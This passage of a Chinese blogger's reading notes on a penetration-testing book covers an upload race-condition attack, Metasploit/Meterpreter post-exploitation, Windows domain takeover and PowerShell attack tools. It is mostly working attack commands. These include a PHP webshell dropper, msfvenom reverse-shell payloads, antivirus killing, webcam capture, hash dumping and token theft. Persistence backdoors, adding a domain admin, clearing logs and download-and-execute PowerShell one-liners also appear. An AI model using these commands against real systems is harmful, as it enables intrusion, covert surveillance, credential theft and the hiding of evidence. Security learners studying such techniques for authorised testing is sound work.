title="竞争条件攻击"></a>竞争条件攻击</h4><p>一些网站上传文件的逻辑是先允许上传任意文件，然后检查上传的文件是否含有webshell，如果包含则删除。</p><p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个PHP文件Bigbroke.php，内容为：</p><pre><code class="php">&lt;?php fputs(fopen(&quot;./shell.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;Bigbroke&quot;]) ?&gt;&#39;); ?&gt;</code></pre><p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的PHP的文件，利用时间差完成了webshell的上传。</p><p>防御：</p><ol><li>通过白名单</li><li>对上传的文件进行重命名，例如rand(10,99)data(“Mango”).”.jpg”</li></ol><h3 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h3><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><p>非授权访问是指用户在没有通过认证授权的情况下能够直接访问需要通过认证才能访问到的页面或文本信息。尝试将一些敏感的页面链接复制于其他浏览器或其他电脑上进行访问，看是否能访问成功。</p><h4 id="越权访问"><a href="#越权访问" class="headerlink" title="越权访问"></a>越权访问</h4><h5 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h5><p>垂直越权（垂直越权是指使用权限低的用户可以访问权限较高的用户）。</p><h5 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h5><p>水平越权（水平越权是指相同权限的不同用户可以互相访问）。</p><p>id=1是一个用户信息 改为id=2可以看到另一个用户信息</p><h2 id="第5章-Metasploit技术"><a href="#第5章-Metasploit技术" class="headerlink" title="第5章 Metasploit技术"></a><strong>第5章 Metasploit技术</strong></h2><p>Metasploit是近年来最强大﹑最流行和最有发展前途的开源渗透测试平台软件之一。它完全颠覆了已有的渗透测试方式。本章详细介绍了Metasploit的攻击步骤﹑信息收集﹑漏洞分析﹑漏洞利用﹑权限提升﹑移植漏洞代码模块，以及如何建立后门的实践方法。并通过具体的内网域渗透测试实例，来分析如何通过一个普通的WebShell权限一步一步获取域管权限，最终畅游整个内网。</p><h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p>模块是通过Metasploit框架装载集成对外提供的最核心的渗透测试功能实现代码。<br>分为</p><p>Aux（辅助模块）</p><p>Exploit（攻击模块）</p><p>Payloads（攻击载荷模块）</p><p>POST（后期渗透模块）</p><p>Encoders（编码器模块）</p><h3 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h3><ul><li>启动metasploit（命令行模式） ：<code>msfconsole</code></li><li>升级metasploit：<code>msfupdate</code></li><li>查看命令使用帮助信息：<code>help [COMMAND]</code></li><li>搜索模块：<code>search</code> [模块名 //(search ms08-067)</li><li>选择模块：<code>use xxx/xxx/xxx</code></li><li>查看模块信息:<code>info</code></li><li>查看攻击载荷：<code>show payloads</code></li><li>设置攻击载荷：<code>set payload xxx/xxx/xxx</code></li><li>查看需要设置的配置参数：<code>show options</code></li><li>设置配置参数：<code>set XXXX xxxxxx</code></li><li>开始攻击：<code>exploit</code></li><li>退出当前模块:<code>back</code></li><li>退出msf : <code>exit</code></li></ul><h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><p>search portscan</p><p>nmap -O -Pn/p0 192.168.11.251 不使用ping 可以穿透防火墙，皮面被防火墙发现</p><h3 id="0x00-进程迁移"><a href="#0x00-进程迁移" class="headerlink" title="0x00 进程迁移"></a>0x00 进程迁移</h3><p>刚获得meterpreter shell时，改shell极其脆弱</p><p>下一步要移动shell使他和目标机中一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作，这样渗透更难被检测到</p><ol><li><p>meterpreter &gt; ps</p><p> pid   PPID   Name            </p><p> 448  3028  explore.exe</p><p> 984     448     138.exe  </p></li><li><p>meterpreter &gt; geipid 获得meterpreter shell的进程号pid984</p></li><li><p>meterpreter &gt; migrate 448  这样把shell移动到Explore.exe进程里。</p></li><li><p>meterpreter &gt; getpid</p><p> current pid：448</p></li><li><p>进程迁移完成后 原先pid为984会自动关闭 ，如果没有则可输入 kill 984 杀掉</p></li></ol><h3 id="0x01-系统命令"><a href="#0x01-系统命令" class="headerlink" title="0x01 系统命令"></a>0x01 系统命令</h3><p>sysinfo</p><p>run post/windows/gather/checkvm   检查目标机是否允许在虚拟机上</p><p>route 查看完整网络配置</p><p>run post/windows/manage/killav 命令关闭目标机杀毒软件</p><p>run post/windows/manage/enable_rdp 开启目标机远程桌面协议</p><p>run post/windows/manage/autoroute 查看网络结构</p><p>background隐藏meterpreter</p><p>然后输入 route add 命令添加路由，添加成功后输入route print命令查看，</p><p>可以看到192.168.172.0路由已经</p><p>run post/windows/gather/enum_logged_on_users 命令列举当前有多少用户登录了目标机</p><p>run post/windows/gather/enum_applications 列举安装在目标机上的应用程序</p><p>run post/windows/gather/credentials/windows_autologin 抓取字典登录的用户名和密码</p><p>meterpreter &gt;screengrab  抓取目标机的屏幕</p><h4 id="网络摄像头摄像头命令"><a href="#网络摄像头摄像头命令" class="headerlink" title="网络摄像头摄像头命令"></a>网络摄像头摄像头命令</h4><pre><code>webcam_list  #查看摄像头webcam_snap   #通过摄像头拍照webcam_stream   #通过摄像头开启视频</code></pre><p>输入shell 进入目标机shell</p><p>exit 停止meterpreter会话</p><h4 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h4><p>search -f *.txt -d c:\  搜索c盘中所有以.txt为扩展名</p><p>download c:\test.txt/root   下载c盘中的test.txt文件到攻击机root下</p><pre><code>upload /tmp/hack.txt C:\ 上传文件到目标机上</code></pre><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>meterpreter &gt; shell</p><p>whoami/groups</p><p>getuid 查看已经获得的权限</p><h5 id="1）getsystem提权"><a href="#1）getsystem提权" class="headerlink" title="1）getsystem提权"></a>1）getsystem提权</h5><pre><code>getsystem</code></pre><p>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名<br>管道.②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接<br>.③Windows服务已启动，导致与命名管道建立连接<br>.④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。</p><p>失败使用</p><p>sysinfo查看已打补丁</p><p>search 其他未打补丁的漏洞</p><h6 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h6><p>Token </p><p>kerberos是一种网络认证协议，通过密钥系统为客户端/服务器应用程序提供强大的认证服务：保护服务器防止错误的用户使用，同时保护它的用户使用正确的服务器，即支持双向验证。</p><p>假冒令牌实战</p><ol><li>meterpreter &gt; getuid 查看已获得权限</li><li>meterpreter &gt; getsystem 失败</li><li>meterpreter &gt; use incognito </li><li>list_tokens -u 列出可用的 token，</li><li>impersonate_token ‘NT AUTHORITY\SYSTEM’  #假冒SYSTEM token<br> 或者impersonate_token NT\ AUTHORITY\SYSTEM #不加单引号 需使用\</li></ol><h6 id="获取哈希"><a href="#获取哈希" class="headerlink" title="获取哈希"></a>获取哈希</h6><p>一、hashdump</p><p>run post/windows/gather/smart_hashdump  #从SAM导出密码哈希 需要SYSTEM权限</p><p>二、使用Quarks PwDump  </p><p>三、使用windows credentials editor </p><p>upload /root/wce.exe c:\</p><p>shell</p><p>四、使用mimikatz</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808312334_767.jpg" alt=""></p><h5 id="2）bypassuac"><a href="#2）bypassuac" class="headerlink" title="2）bypassuac"></a>2）bypassuac</h5><p>内置多个pypassuac脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限，如：</p><pre><code>use exploit/windows/local/bypassuacuse exploit/windows/local/bypassuac_injectionuse windows/local/bypassuac_vbsuse windows/local/ask</code></pre><p>如使用bypassuac.rb脚本：</p><pre><code>msf &gt; use exploit/windows/local/bypassuacmsf &gt; set SESSION 2msf &gt; run</code></pre><p>移植利用github 其他poc</p><ol><li><p>git clone</p></li><li><p>复制 *.rb到/usr/share/metasploit-framework/modules/exploits/windows/smb下，</p></li><li><p>ls查看是否加载完成</p></li><li><p>reload_all</p></li><li><p>search *</p></li><li><p>use  </p></li><li><p>攻击之前先生成一个dll 文件，如果目标机是32就生成32位dll</p></li><li><p>免杀使用powershell下的empire生成dll，</p></li><li><p>64位使用：msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.31.147 lport=3333 -f dll -o ~/eternal11.dll</p><p> 32位使用:   msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.31.147 lport=3333 -f dll -o ~/eternal11.dll</p></li><li><p>exploit</p></li></ol><h3 id="0x03-后门"><a href="#0x03-后门" class="headerlink" title="0x03 后门"></a>0x03 后门</h3><h4 id="后门工具Cymothoa"><a href="#后门工具Cymothoa" class="headerlink" title="后门工具Cymothoa"></a>后门工具Cymothoa</h4><p>Cymothoa是一款隐秘的后门工具。它通过向目标主机活跃的进程注入恶意代码，从而获取和原进程相同的权限。该工具最大的优点就是不创建新的进程，不容易被发现。由于该工具基于ptrace库，所以适合各种类Unix系统。该工具提供14种攻击载荷，可以实现各种攻击和后门。由于该后门是基于进程注入，所以当原有进程结束，后门也会被关闭。所以，渗透测试必须结合自启动脚本，注入到自启动服务中（如Web服务），才能使Cymothoa的脚本持久有效。</p><p>但是如果进程关闭或者重启，后门就停止运行。</p><ol><li>ps -aux 查看程序的pid （windows使用 tasklist）</li><li>Cymothoa -p（目标进程pid） 982 -s(shellcode编号) 1-y 3333(指定payload服务端口)</li><li>nc -nvv 192.168.31.47 4444</li></ol><h4 id="persistence"><a href="#persistence" class="headerlink" title="persistence"></a>persistence</h4><pre><code class="shell"> run persistence -h run persistence -A -S -U -i 60 -p 4231 -r 192.168.172.138</code></pre><p>选项：</p><pre><code>-P：设置Payload，默认为windows/meterpreter/reverse_tcp。该默认的payload生成的后门为32位程序。因此，当目标机器为64位系统时，留下的后门将无法运行；-U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。推荐使用该参数；-X：设置后门在系统启动后自启动。该方式会在HKLM\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。由于权限问题，会导致添加失败，后门将无法启动。因此，在非管理员权限或者未进行BypassUAC操作情况下，不推荐使用该参数；-i：设置反向连接间隔时间，单位为秒。当设置该参数后，目标机器会每隔设置的时间回连一次所设置的ip；-p：设置反向连接的端口号。即黑阔用来等待连接的端口；-r：设置反向连接的ip地址。即黑阔用来等待连接的ip；</code></pre><p>web后门</p><p>meterpreter后门</p><ol><li><p>msfvenom创建一个webshell     ：msfvenom -p php/meterpreter/reverse_tcp LHOST 192.168.31.247 -f raw &gt; shuteer.php </p></li><li><pre><code> msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows /meterpreter/reverse_tcp payload =&gt; windows /meterpreter/reverse_tcp msf exploit(handler) &gt; set LHOST 192.168.17.131 LHOST =&gt; 192.168.17.131 msf exploit(handler) &gt; set LPORT 6666 LPORT =&gt; 6666 msf exploit(handler) &gt; exploit</code></pre></li><li><p>打开<a href="http://127.0.0.1/shuteer.php" target="_blank" rel="external">http://127.0.0.1/shuteer.php</a></p></li><li><p>反弹成功</p></li></ol><p>aspx meterpreter后门</p><ol><li><p>```<br>show payloads</p></li></ol><p>use windows/shell_reverse_tcp</p><p>info</p><p>set lhost</p><p>set lport</p><p>save</p><pre><code>1. generate -h2. generate -t  aspx3. 上传到目标机c盘4.</code></pre><pre><code>msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload windows /meterpreter/reverse_tcppayload =&gt; windows /meterpreter/reverse_tcpmsf exploit(handler) &gt; set LHOST 192.168.17.131LHOST =&gt; 192.168.17.131msf exploit(handler) &gt; set LPORT 6666LPORT =&gt; 6666msf exploit(handler) &gt; run```</code></pre><h3 id="0x04-内网域渗透"><a href="#0x04-内网域渗透" class="headerlink" title="0x04 内网域渗透"></a>0x04 内网域渗透</h3><h4 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h4><p>提权 ms17010 ms15078</p><p>使用bypassuac提权（系统当前用户必须在管理员组，用户账号控制uac设置为默认） </p><pre><code>use exploit/windows/local/bypassuacset session 1run</code></pre><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><pre><code>ipconfig /all                                          查询本机IP段，所在域等  net user                                               本机用户列表    net view                                               查询同一域内机器列表    net view /domain                                       查询域列表    net view /domain:domainname                            查看workgroup域中计算机列表net group /domain                                      查询域里面的工作组   net group &quot;domain computers&quot; /domain                      查询域内所有的主机名net group &quot;domain admins&quot; /domain                      查询域管理员用户组    net group &quot;domain controllers&quot; /domain                 查看域控制器(如果有多台) net group &quot;enterprise admins&quot; /domain                      查询企业管理组net localgroup administrators                          本机管理员[通常含有域用户]    net localgroup administrators /domain                  登录本机的域管理员    net localgroup administrators workgroup\user001 /add   域用户添加到本机   net user /domain                                       查询域用户    net time /domain                                       判断主域，主域服务器都做时间服务器 net config workstation                                 当前登录域net session                                            查看当前会话 net use \\ip\ipc$ pawword /user:username               建立IPC会话[空连接­***] net share                                              查看SMB指向的路径[即共享net start                                              查看当前运行的服务 net accounts                                           查看本地密码策略 net accounts /domain                                   查看域密码策略nbtstat –A ip                                          netbios 查询  netstat –an/ano/anb                                    网络连接查询  route print                                            路由表</code></pre><h4 id="ipc-入侵实战"><a href="#ipc-入侵实战" class="headerlink" title="ipc$入侵实战"></a>ipc$入侵实战</h4><p>net use \127.0.0.21\ipc$    连接ipc共享</p><p>copy 1.exe \127.0.0.21\ipc$   复制1.exe到目标主机</p><p>net time  \127.0.0.21 查看服务器上的时间</p><p>at \127.0.0.21 10:50 1.exe <code>at</code>命令来设置定时任务</p><p>反弹meterpreter shell</p><p>handler监听</p><p>sysinfo 查看服务器信息和权限</p><p>getuid  查看权限</p><p>使用mimikatz或者hashdump抓hash</p><p>net use \127.0.0.21 \ipc$ /del 渗透完毕后删掉记录</p><h4 id="powershell寻找域管在线服务器"><a href="#powershell寻找域管在线服务器" class="headerlink" title="powershell寻找域管在线服务器"></a>powershell寻找域管在线服务器</h4><pre><code class="shell">powershell.exe -exec bypass -Command &quot;&amp;{Import-Module .\powerview.ps1;Invoke-UserHunter}&quot;`</code></pre><p>获取当域管理员在线登录的服务器，ip</p><p>主机名为pav… ip为…</p><h4 id="获取域管权限"><a href="#获取域管权限" class="headerlink" title="获取域管权限"></a>获取域管权限</h4><p>getsystem  提权</p><p>ps 找到与管理所在的进程</p><p>migrate 进程pid    把meterpreter shell进程迁移此进程</p><p>getuid</p><p>net time 查看主域控ip（一般来说时间服务器都是域服务器）</p><p>得到域服务器的主机名为PAV Ip为10.51.0.11</p><p>使用ipc$ 反弹meterpreter shell</p><p>net user Bigbroke pass /ad /domain 添加用户</p><p>net group “domain admins” /domain 给域控添加管理员</p><h4 id="登录域控制"><a href="#登录域控制" class="headerlink" title="登录域控制"></a>登录域控制</h4><p>具体可以看书</p><p>将最好的方式：使用metasploit下的PsExec反弹meterpreter，</p><p>注意两点</p><ul><li>MSF中的PsExec模块</li><li>cuestom模块，建议使用类似Veil生成免杀payload</li></ul><pre><code class="shell">msf auxiliary(scanner/portscan/tcp) &gt; use exploit/multi/handlermsf exploit(multi/handler) &gt; use exploit/windows/smb/psexecmsf exploit(windows/smb/psexec) &gt; show options Module options (exploit/windows/smb/psexec):   Name                  Current Setting  Required  Description   ----                  ---------------  --------  -----------   RHOST                                  yes       The target address   RPORT                 445              yes       The SMB service port (TCP)   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing   SERVICE_DISPLAY_NAME                   no        The service display name   SERVICE_NAME                           no        The service name   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share   SMBDomain             .                no        The Windows domain to use for authentication   SMBPass                                no        The password for the specified username   SMBUser                                no        The username to authenticate asExploit target:   Id  Name   --  ----   0   Automaticmsf exploit(windows/smb/psexec) &gt; set smbuser Bigbrokesmbuser =&gt; Bigbrokemsf exploit(windows/smb/psexec) &gt; set smbpass passmsf exploit(windows/smb/psexec) &gt; set rhost 10.51.0.11rhost =&gt; 10.51.0.11msf exploit(windows/smb/psexec) &gt; runmeterpreter &gt; migrate 2416meterpreter &gt; getuidmeterpreter &gt; getpidmeterpreter &gt; sysinfo</code></pre><p>抓hash（system权限）</p><h4 id="smb爆破内网"><a href="#smb爆破内网" class="headerlink" title="smb爆破内网"></a>smb爆破内网</h4><p>有域控密码 ，接下来内网扩大控制权限</p><ul><li>利用当前获取的域控账号密码，对整个域控ip段扫描</li><li>利用smb下的sm_login模块</li><li>端口转发或者socks代理进内网</li></ul><pre><code>meterpreter &gt; backgroundmsf exploit(multi/handler) &gt; route add 10.51.0.11 255.255.0.0msf exploit(multi/handler) &gt; search smb_loginmsf exploit(multi/handler) &gt; use auxiliary/scanner/smb/smb_login msf auxiliary(scanner/smb/smb_login) &gt; set rhostsmsf auxiliary(scanner/smb/smb_login) &gt; set smbuser msf auxiliary(scanner/smb/smb_login) &gt; set smbpassmsf auxiliary(scanner/smb/smb_login) &gt; set smbdomain msf auxiliary(scanner/smb/smb_login) &gt; set threads 16msf auxiliary(scanner/smb/smb_login) &gt; set creds</code></pre><p>可以使用meterpreter的端口转发，也可以使用metasploit下的 socks4a模块</p><p>meterpreter &gt; portfwd add -l 5555 -p 3389 -r 127.0.0.1</p><h3 id="0x05-清理日志"><a href="#0x05-清理日志" class="headerlink" title="0x05 清理日志"></a>0x05 清理日志</h3><ul><li>删除之前的域管理账号</li><li>删除所有在渗透过程中使用过的工具</li><li>删除应用程序、系统和安全日志</li><li>关闭所有meterpreter</li></ul><p>删除账号</p><pre><code>net user Bigbroke /dellogoff</code></pre><p>删除日志</p><p>meterpreter &gt; clearev</p><p>关闭所有msf连接</p><p>msf exploit(psexec) &gt; sessions</p><p>msf exploit(psexec) &gt;  sessions -K</p><h3 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h3><h2 id="第6章-PowerShell攻击指南"><a href="#第6章-PowerShell攻击指南" class="headerlink" title="第6章 PowerShell攻击指南"></a><strong>第6章 PowerShell攻击指南</strong></h2><p>学习推荐windows powershell 实战指南和三叶草师傅的gitbook<a href="https://legacy.gitbook.com/book/rootclay/powershell-attack-guide/details" target="_blank" rel="external">https://legacy.gitbook.com/book/rootclay/powershell-attack-guide/details</a></p><p>在渗透测试中，PowerShell是不能忽略的一个环节，而且仍在不断地更新和发展，它具有令人难以置信的灵活性和功能化管理Windows系统的能力。PowerShell的众多特点使得它在获得和保持对系统的访问权限时，也成为攻击者首选的攻击手段。本章详细介绍了PowerShell的基本概念和常用命令，以及PowerSploit﹑Empire﹑Nishang等常用PowerShell攻击工具的安装及具体模块的使用，包括生成木马、信息探测、权限提升、横向渗透、凭证窃取、键盘记录、后门持久化等操作。</p><p>常用工具</p><ul><li>powerSplit</li><li>Nishang</li><li>Empire</li><li>PowerCat</li></ul><h3 id="Powershell基础"><a href="#Powershell基础" class="headerlink" title="Powershell基础"></a>Powershell基础</h3><p>powershell的后缀是ps1，哪为什么是ps1而不是ps2,ps3呢？那么理解这个问题呢我们可以看看powershell的特性，powershell是对下完全兼容的，也就是说你使用powershell 5.x的版本来执行powershell v1.0的代码也是完全没有问题的。</p><h4 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h4><p> PowerShell 提供了 Restricted、AllSigned、RemoteSigned、Unrestricted、Bypass、Undefined 六种类型的执行策略</p><p>如何绕过这些安全策略，下面提供几种方法，网上还有很多的绕过方法，：</p><table><thead><tr><th>名称</th><th>说明</th><th></th></tr></thead><tbody><tr><td>Get-ExecutionPolicy</td><td>获取当前的执行策略</td><td></td></tr><tr><td>Get-Content .\test.ps1 \</td><td>powershell.exe -noprofile -</td><td>通过管道输入进ps</td></tr><tr><td>powershell -nop -c “iex(New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.1.2/test.ps1" target="_blank" rel="external">http://192.168.1.2/test.ps1</a>‘)”</td><td>通过远程下载脚本来绕过</td><td></td></tr><tr><td><code>$command = &quot;Write-Host &#39;Hello World!&#39;&quot; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)  $encodedCommand = [Convert]::ToBase64String($bytes)  powershell.exe -EncodedCommand $encodedCommand</code></td><td>通过BASE64编码执行</td></tr></tbody></table><h4 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h4><p>1.直接执行脚本.\shell.ps1</p><p>2.C:\Scripts\shell.ps1</p><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><p>powershell -ExecutionPolicy Bypass -File .\xxx.ps1 绕过本地权限执行</p><p>powershell -EncodedCommand dwBoAG8AYQBtAGkACgA=</p><p>Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File .\xxx.ps1 本地隐藏绕过权限执行脚本</p><h3 id="Powersploit"><a href="#Powersploit" class="headerlink" title="Powersploit"></a>Powersploit</h3><p>AntivirusBypass:发现杀毒软件的查杀特征</p><p>CodeExecution:在目标机上执行代码</p><p>Exfiltration:目标主机上的信息搜集工具</p><p>Mayhem:蓝屏等破坏性脚本</p><p>Persistence:后门脚本</p><p>Recon:以目标主机为跳板进行内网信息侦查</p><p>ScriptModification：目标主机上创建或修改脚本</p><h4 id="一-执行shellcode反弹meterpreter-shell"><a href="#一-执行shellcode反弹meterpreter-shell" class="headerlink" title="一.执行shellcode反弹meterpreter shell"></a>一.执行shellcode反弹meterpreter shell</h4><p>1.使用msfvenom生成一个powershell脚本。</p><p> <code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.125 LPORT=4444 -f powershell -o /var/www/html/test</code></p><p>2.目标机powershell输入以下命令</p><pre><code>IEX(New-ObjectNet.WebClient).DownloadString(&amp;quot;http://192.168.110.129/CodeExecution/Invoke-Shellcode.ps1&amp;quot;)`IEX (New-ObjectNet.WebClient).DownloadString(&amp;quot;http://192.168.110.129/test&amp;quot;)Invoke-Shellcode -Shellcode ($buf)</code></pre><p>msf反弹成功</p><p>其他扩展可以看先知师傅的</p><p><a href="https://xz.aliyun.com/t/263" target="_blank" rel="external">https://xz.aliyun.com/t/263</a></p><h4 id="绕过杀软执行-invoke-Mimikatz"><a href="#绕过杀软执行-invoke-Mimikatz" class="headerlink" title="绕过杀软执行 invoke-Mimikatz"></a>绕过杀软执行 invoke-Mimikatz</h4><p><a href="https://zhuanlan.zhihu.com/p/24859556" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/24859556</a></p><h3 id="Powerup"><a href="#Powerup" class="headerlink" title="Powerup"></a>Powerup</h3><p>通过脆弱的Windows服务提权；或者通过常见的系统服务，通过其继承的系统权限来完成提权等等，在内核提权行不通的时候，帮助我们寻找服务器脆弱点进而通过脆弱点实现提权的目的。</p><p>加载脚本模块: Import-Module .\PowerUp.ps1</p><p>查看模块的详细说明：Get-Help Invoke-AllChecks -full </p><p>执行所有的脚本来检查: Invoke-AllChecks</p><p>检查当前%PATH%是否存在哪些目录是当前用户可以写入的： Find-PathDLLHijack</p><p>从系统上的applicationHost.config文件恢复加密过的应用池和虚拟目录的密码: Get-ApplicationHost</p><p>检查AlwaysInstallElevated注册表项是否被设置，如果被设置，意味着的MSI文件是以system权限运行的: Get-RegistryAlwaysInstallElevated</p><p>检测Winlogin注册表AutoAdminLogon项有没有被设置，可查询默认的用户名和密码: Get-RegistryAutoLogon</p><p>获取DHCP服务的详细信息: Get-ServiceDetail -ServiceName Dhcp</p><p>检查当前用户能够在哪些服务的目录写入相关联的可执行文件，通过这些文件可达到提权的目的： Get-ServiceFilePermission</p><p>检查所有可用的服务，并尝试对这些打开的服务进行修改，如果可修改，则返回该服务对象：Test-ServiceDaclPermission</p><p>检查服务路径，返回包含空格但是不带引号的服务路径： Get-ServiceUnquoted</p><p>检查几个路径，查找是否存在这些文件，在这些文件里可能包含有部署凭据：Get-UnattendedInstallFile</p><pre><code>c:sysprepsysprep.xmlc:sysprepsysprep.infc:sysprep.infc:windowsPantherUnattended.xmlc:windowsPantherUnattendUnattended.xmlc:windowsPantherUnattend.xmlc:windowsPantherUnattendUnattend.xmlc:windowsSystem32Sysprepunattend.xmlc:windowsSystem32SysprepPantherunattend.xml</code></pre><p>检查开机自启的应用程序路径和注册表键值，返回当前用户可修改的程序路径： Get-ModifiableRegistryAutoRun</p><p>返回当前用户能够修改的计划任务程序的名称和路径： Get-ModifiableScheduledTaskFile</p><p>返回当前服务器上的web.config文件中的数据库连接字符串的明文：Get-Webconfig</p><p>用来通过修改服务添加用户到指定组，并可以通过定制-cmd参数触发添加用户的自定义命令： </p><pre><code>PS C:&gt; Invoke-ServiceAbuse -ServiceName VulnSVC # 添加默认账号PS C:&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -UserName &quot;TESTLABjohn&quot; # 指定添加域账号PS C:&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -UserName backdoor -Password password -LocalGroup &quot;Administrators&quot; # 指定添加用户，用户密码以及添加的用户组。PS C:&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -Command &quot;net ...&quot;# 自定义执行命令</code></pre><p>恢复服务的可执行文件到原始目录：</p><pre><code>Restore-ServiceBinary -ServiceName VulnSVC</code></pre><p>检查某个用户是否在一个服务有自由访问控制的权限，返回true或false：Restore-ServiceBinary -ServiceName VulnSVC</p><p>输出一个自定义命令并且能够自删除的bat文件到$env:Tempdebug.bat，并输出一个能够启动这个bat文件的dll：Write-HijackDll</p><p>预编译C#服务的可执行文件。默认创建一个默认管理员账号。可通过Command定制自己的命令：</p><pre><code>PS C:&gt;Write-ServiceBinary -ServiceName VulnSVC # 添加默认账号PS C:&gt;Write-ServiceBinary -ServiceName VulnSVC -UserName &quot;TESTLABjohn&quot; # 指定添加域账号PS C:&gt;Write-ServiceBinary-ServiceName VulnSVC -UserName backdoor -Password Password123! # 指定添加用户，用户密码以及添加的用户组PS C:&gt; Write-ServiceBinary -ServiceName VulnSVC -Command &quot;net ...&quot; # 自定义执行命令</code></pre><p>通过Write-ServiceBinary写一个C#的服务用来添加用户：</p><pre><code>PS C:&gt; Install-ServiceBinary -ServiceName DHCPPS C:&gt; Install-ServiceBinary -ServiceName VulnSVC -UserName &quot;TESTLABjohn&quot;PS C:&gt;Install-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!PS C:&gt; Install-ServiceBinary -ServiceName VulnSVC -Command &quot;net ...&quot;</code></pre><h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><p>篇幅过程细读此两篇文章</p><p><a href="https://www.anquanke.com/post/id/87328" target="_blank" rel="external">https://www.anquanke.com/post/id/87328</a></p><p><a href="https://www.anquanke.com/post/id/87333" target="_blank" rel="external">https://www.anquanke.com/post/id/87333</a></p><p>这里学到的tips在于：在内网抓取的密码比较多又乱的时候，可以通过命令来正对hash/plaintext进行排列，增加，删除，导出等操作，这里我们将凭证存储导出为，输入creds export 目录/xx.csv命令。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>读完此书，学到了很多对于后渗透阶段怎么进行和优化，对于安全，一定不能忘却初心。</p>]]></content>
      
      
      <categories>
          
          <category> 读书摘要 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书摘要 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>验证码相关安全问题</title>
      <link href="/archis/b46a6d47/"/>
      <url>/archis/b46a6d47/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-乌云知识库"><a href="#0x00-乌云知识库" class="headerlink" title="0x00 乌云知识库:"></a>0x00 乌云知识库:</h2><ul><li><a href="http://drops.ichenfei.com/web-5459.html" target="_blank" rel="external">验证码安全问题汇总</a></li><li><a href="http://drops.ichenfei.com/tips-141.html" target="_blank" rel="external">聊一聊随机数安全</a></li><li><a href="http://drops.ichenfei.com/web-5048.html" target="_blank" rel="external">密码找回逻辑漏洞总结</a></li><li><a href="http://drops.ichenfei.com/papers-2035.html" target="_blank" rel="external">一些常见的重置密码漏洞分析整理</a></li></ul><h2 id="0x01-其他相关文章"><a href="#0x01-其他相关文章" class="headerlink" title="0x01 其他相关文章"></a>0x01 其他相关文章</h2><ul><li><a href="http://www.cnbraid.com/2016/captcha.html" target="_blank" rel="external">【安全加固】 验证码的实现原理和安全问题汇总</a></li><li><a href="http://blog.csdn.net/niaonao/article/details/51112686" target="_blank" rel="external">验证码原理分析及实现</a></li><li><a href="https://lizonghang.github.io/2016/07/10/%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%AD%97%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%81%E7%94%9F%E6%88%90%E5%92%8C%E7%A0%B4%E8%A7%A3/" target="_blank" rel="external">随机数字图片验证码的原理、生成和破解</a></li><li><a href="http://www.lijiejie.com/safe-issues-of-captcha/" target="_blank" rel="external">图形验证码的常见安全问题</a></li></ul><h2 id="0x02-乌云相关案例"><a href="#0x02-乌云相关案例" class="headerlink" title="0x02 乌云相关案例"></a>0x02 乌云相关案例</h2><ul><li><a href="http://wy.ichenfei.com/searchbug.php?q=%E9%AA%8C%E8%AF%81%E7%A0%81" 